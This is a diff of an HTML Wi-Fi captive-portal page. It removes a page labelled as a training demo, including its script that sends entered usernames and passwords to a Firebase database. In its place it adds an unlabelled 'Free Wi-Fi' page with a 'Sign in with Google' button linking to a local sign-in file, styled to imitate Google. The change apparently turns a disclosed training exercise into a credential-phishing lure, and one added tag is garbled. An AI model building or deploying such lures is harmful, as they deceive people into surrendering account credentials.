@@ -1,80 +1,285 @@
 <!doctype html>
-<html lang="en">
+<html lang='en'>
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Guest Wi‑Fi Portal (Training Demo)</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+<link rel="icon" type="image/png" sizes="32x32" hrefsizes="16x16" href-icon" href
+  <meta charset='utf-8'>
+  <meta name='viewport' content='width=device-width, initial-scale=1'>
+<link href='https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap' rel='stylesheet'>
+  <title>Free Wi-Fi</title>
   <style>
-    :root { --bg:#0b1220; --card:#121a2b; --accent:#59d185; --text:#e7eef8; --muted:#9ab0cf; }
-    *{box-sizing:border-box}
-    body{margin:0; font-family:'Inter',system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif; background:linear-gradient(160deg,#0b1220 0%, #10172a 50%, #0b1220 100%); color:var(--text); min-height:100vh; display:grid; place-items:center;}
-    .card{width:min(460px,92vw); background:var(--card); border:1px solid rgba(255,255,255,.06); border-radius:20px; padding:28px; box-shadow:0 12px 40px rgba(0,0,0,.35)}
-    h1{font-size:1.25rem; margin:0 0 6px 0}
-    p.sub{margin:0 0 22px 0; color:var(--muted); font-size:.95rem}
-    label{display:block; font-weight:600; margin:14px 0 8px 0}
-    input{width:100%; padding:12px 14px; border-radius:12px; border:1px solid rgba(255,255,255,.12); background:#0e1524; color:var(--text); outline:none}
-    input:focus{border-color:var(--accent); box-shadow:0 0 0 3px rgba(89,209,133,.15)}
-    .actions{display:flex; align-items:center; justify-content:space-between; margin-top:18px}
-    button{background:var(--accent); border:0; color:#0b1220; font-weight:700; padding:12px 16px; border-radius:12px; cursor:pointer}
-    .fineprint{margin-top:14px; color:var(--muted); font-size:.8rem}
-    .badge{display:inline-flex; align-items:center; gap:8px; background:#0e1524; border:1px dashed rgba(255,255,255,.12); color:var(--muted); padding:8px 10px; border-radius:12px; font-size:.82rem}
-    .notice{margin-top:10px; font-size:.85rem; color:#9ab0cf}
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f9fafb;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      text-align: center;
+      background: #202124;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      max-width: 500px;
+    }
+    .logo img {
+      max-width: 100%;
+      height: auto;
+      margin-bottom: 20px;
+    }
+    h1 {
+      font-size: 2rem;
+      margin-bottom: 10px;
+      color: #fff; /* changed from #333 */
+    }
+    p {
+      color: #fff; /* changed from #555 */
+      margin-bottom: 20px;
+
+    }
+    .google-btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      background-color: #ffffff;
+      color: #000000;
+      font-weight: bold;
+      padding: 12px 20px;
+      border-radius: 6px;
+      text-decoration: none;
+      font-size: 16px;
+    }
+    .google-btn:hover {
+      background-color: #357ae8;
+    }
+    .google-btn img {
+      width: 20px;
+      height: 20px;
+      margin-right: 10px;
+    }
+    
+    :root {
+      --bg:#0f1113;
+      --card:#202124;
+      --bd:#3c4043;
+      --txt:#e8eaed;
+      --mut:#9aa0a6;
+      --link:#8ab4f8;
+      --accent:#8ab4f8;
+      --input:#5f6368;
+    }
+    * {
+      box-sizing:border-box;
+    }
+    body {
+      margin:0;
+      background:var(--bg);
+      color:#fff; /* change to white */
+      font-family:Roboto,system-ui,-apple-system,Segoe UI,Helvetica,Arial,sans-serif;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      min-height:100vh;
+    }
+    .wrap {
+      width:min(920px,96vw);
+    }
+    .banner {
+      position:fixed;
+      top:8px;
+      left:50%;
+      transform:translateX(-50%);
+      background:#1f2937;
+      color:#93c5fd;
+      border:1px solid #374151;
+      padding:6px 10px;
+      border-radius:999px;
+      font-size:.85rem;
+    }
+    .card {
+      background:#202124;
+      border:1px solid var(--bd);
+      border-radius:18px;
+      box-shadow:0 2px 8px rgba(0,0,0,.4);
+      padding:28px;
+    }
+    .content {
+      display:grid;
+      grid-template-columns:1.1fr 1fr;
+      gap:40px;
+    }
+    @media (max-width:800px) {
+      .content {
+        grid-template-columns:1fr;
+        gap:24px;
+      }
+    }
+    .left {
+      padding:8px 8px 8px 12px;
+    }
+    .gmark {
+      display:flex;
+      align-items:center;
+      gap:10px;
+      margin-bottom:10px;
+    }
+    .glogo {
+      display:inline-grid;
+      grid-template-columns:repeat(2,10px);
+      grid-auto-rows:10px;
+      gap:3px;
+    }
+    .glogo span {
+      display:block;
+      width:10px;
+      height:10px;
+      border-radius:50%;
+    }
+    .r {
+      background:#ea4335;
+    }
+    .y {
+      background:#fbbc05;
+    }
+    .g {
+      background:#34a853;
+    }
+    .b {
+      background:#4285f4;
+    }
+    .brand {
+      font-weight:500;
+      letter-spacing:.2px;
+    }
+    h1.title {
+      margin:4px 0 8px;
+      font-size:2.4rem;
+      font-weight:300;
+      color: #fff; /* white text */
+    }
+    p.sub {
+      margin:0;
+      color:#e8eaed; /* lighter white */
+    }
+    .right {
+      padding-top:6px;
+    }
+    label {
+      display:block;
+      font-size:.95rem;
+      color:#e8eaed; /* white */
+      margin:0 0 8px 2px;
+    }
+    input, select {
+      width:100%;
+      background:#202124;
+      color:var(--txt);
+      border:1px solid var(--input);
+      border-radius:6px;
+      padding:14px 12px;
+      font-size:1rem;
+    }
+    input:focus, select:focus {
+      outline:2px solid #263238;
+      border-color:#8ab4f8;
+    }
+    .row {
+      display:grid;
+      grid-template-columns:1fr 1fr;
+      gap:12px;
+    }
+    .hint {
+      margin-top:10px;
+    }
+    .hint a {
+      color:#8ab4f8;
+      text-decoration:none;
+    }
+    .error {
+      color:#f28b82;
+      font-size:.85rem;
+      margin-top:6px;
+      display:none;
+    }
+    .note {
+      margin-top:18px;
+      color:#e8eaed; /* changed to white */
+      line-height:1.45;
+    }
+    .note a {
+      color:#8ab4f8;
+      text-decoration:none;
+    }
+    .actions {
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      margin-top:22px;
+    }
+    .actions a {
+      color:#8ab4f8;
+      text-decoration:none;
+      font-weight:500;
+    }
+    button:disabled {
+      background:#5f6368;
+      cursor:not-allowed;
+    }
+    .next {
+      background:#8ab4f8;
+      color:#202124;
+      border:0;
+      border-radius:20px;
+      padding:10px 20px;
+      font-weight:500;
+      cursor:pointer;
+    }
+    .footer {
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      padding:10px 6px 0;
+      color:#e8eaed; /* changed to white */
+      font-size:.9rem;
+    }
+    .footer a {
+      color:#e8eaed; /* changed to white */
+      text-decoration:none;
+      margin-left:16px;
+    }
+    .legal {
+      margin-top:14px;
+      color:#e8eaed; /* changed to white */
+      font-size:.85rem;
+      text-align:center;
+    }
+    .hidden {
+      display:none;
+    }
+    .fade-enter {
+      opacity:0;
+      transform:translateY(6px);
+    }
+    .fade-enter-active {
+      opacity:1;
+      transform:translateY(0);
+      transition:all .18s ease;
+    }
   </style>
 </head>
 <body>
-  <main class="card">
-    <div class="badge">🔗 Guest Wi‑Fi • Training Simulation</div>
-    <h1>Connect to Guest Wi‑Fi</h1>
-    <p class="sub">Enter your portal username and password to get online.</p>
-
-    <form id="loginForm" autocomplete="off">
-      <label for="username">Username</label>
-      <input id="username" name="username" required placeholder="e.g. jsmith" />
-
-      <label for="password">Password</label>
-      <input id="password" name="password" type="password" required placeholder="••••••••" />
-
-      <div class="actions">
-        <div></div>
-        <button type="submit">Get Online</button>
-      </div>
-      <p class="fineprint">By continuing you agree to the Acceptable Use Policy.</p>
-      <p class="notice">Training note: Use <strong>fake</strong> credentials only. This demo records inputs to a training dashboard.</p>
-    </form>
-  </main>
-
-  <!-- Firebase (compat builds for simple scripts) -->
-  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
-  <script src="firebase-config.js"></script>
-  <script>
-    // Initialize Firebase
-    const app = firebase.initializeApp(window.FIREBASE_CONFIG);
-    const db = firebase.database();
-    const sessionId = window.SESSION_ID || 'demo-session-1';
-
-    document.getElementById('loginForm').addEventListener('submit', async (e) => {
-      e.preventDefault();
-      const u = document.getElementById('username').value.trim();
-      const p = document.getElementById('password').value.trim();
-      const entry = {
-        username: u || '(blank)',
-        password: p || '(blank)',
-        ua: navigator.userAgent,
-        ts: Date.now()
-      };
-
-      try {
-        await db.ref(`sessions/${sessionId}/entries`).push(entry);
-      } catch (err) {
-        console.error('Failed to submit to live panel:', err);
-      }
-
-      // Redirect to the reveal page (local, not stored anywhere else)
-      const qp = new URLSearchParams({ u, p }).toString();
-      location.href = 'reveal.html?' + qp;
-    });
-  </script>
+  <div class='container'>
+    <div class='logo'>
+      <img src='https://futuremakerlab.com/wp-content/uploads/2023/03/FutureMaker_logo-white-4k-800x200.png' alt='FutureMaker Mobile Learning Lab Logo'>
+    </div>
+    <h1>Free Wi-Fi</h1>
+    <p>Sign in with Google to access the internet securely.</p>
+    <a class='google-btn' href='Sign in.html'>
+      <img src='https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg' alt='Google Logo'>
+      Sign in with Google
+    </a>
+  </div>
 </body>
 </html>
